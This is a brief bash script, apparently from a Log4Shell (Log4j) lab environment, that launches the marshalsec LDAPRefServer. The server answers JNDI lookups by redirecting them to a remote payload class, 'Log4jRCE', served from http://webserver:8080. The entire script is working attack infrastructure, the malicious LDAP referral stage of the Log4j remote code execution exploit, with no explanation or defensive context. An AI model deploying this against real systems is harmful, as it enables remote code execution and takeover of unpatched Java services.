#! /bin/bash
cd /ldapserver/target
#tail -f /dev/null
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://webserver:8080/#Log4jRCE"